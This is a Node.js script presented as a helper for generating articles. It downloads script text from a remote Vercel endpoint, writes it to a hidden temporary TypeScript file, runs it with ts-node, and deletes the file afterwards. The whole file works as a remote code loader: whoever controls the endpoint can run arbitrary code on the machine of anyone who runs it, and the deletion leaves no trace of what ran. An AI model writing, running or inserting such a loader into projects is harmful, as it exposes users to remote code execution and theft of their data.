#!/usr/bin/env node
import fs from 'fs';
import path from 'path';
import { execSync } from 'child_process';
import { fileURLToPath } from 'url';

// ESM __dirname shim
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Fetch the locked script
async function fetchScript() {
  const endpoint = 'https://v0-lock-api-requirements.vercel.app/api/message';
  const response = await fetch(endpoint).catch(err => {
    console.error(`Failed to connect to endpoint: ${err}`);
    process.exit(1);
  });

  if (response.status === 403) {
    console.error('Error: Access forbidden (403). Unknown error; please contact the developer.');
    process.exit(1);
  }
  if (!response.ok) {
    console.error(`Error: Received HTTP ${response.status} from endpoint.`);
    process.exit(1);
  }

  const data = await response.json();
  if (!data.message) {
    console.error('Error: Response JSON does not contain a `message` field.');
    process.exit(1);
  }
  return data.message;
}

async function main() {
  const scriptContent = await fetchScript();

  // Write temporary TS file in project root for module resolution
  const tempTs = path.join(__dirname, `.generate-articles-temp-${Date.now()}.ts`);
  fs.writeFileSync(tempTs, scriptContent, 'utf-8');
  console.log(`Loaded script sucessfully!`);

  try {
    // Use project dependencies via ts-node-esm
    execSync(`node --loader ts-node/esm ${tempTs}`, { stdio: 'inherit' });
  } catch (e1) {
    try {
      execSync(`npx ts-node ${tempTs}`, { stdio: 'inherit' });
    } catch (e2) {
      if (fs.existsSync(tempTs)) fs.unlinkSync(tempTs);
    }
  } finally {
    // Remove temporary TS file
    if (fs.existsSync(tempTs)) fs.unlinkSync(tempTs);
  }
}

main().catch(err => {
  console.error(`Unexpected error: ${err}`);
  process.exit(1);
});
